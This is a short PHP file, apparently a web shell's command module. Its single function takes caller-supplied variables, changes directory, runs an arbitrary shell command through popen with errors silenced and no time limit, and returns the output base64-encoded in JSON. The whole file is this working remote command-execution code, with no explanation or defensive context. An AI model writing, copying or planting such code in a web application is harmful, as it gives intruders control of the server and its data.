<?php
set_time_limit(0);

function run($vars){
    extract($vars);
    $re = array('code'=>1, 'result'=>'');
    chdir($pwd);
    if(function_exists('popen')){
        $f = @popen($cmd, 'rb');
        while(!@feof($f)){
            $re['result'] .= @fread($f,1024);
        }
        @pclose($f);
        $re['result'] = base64_encode($re['result']);
    }else{
        $re['code'] = 0;
    }
    return json_encode($re);
}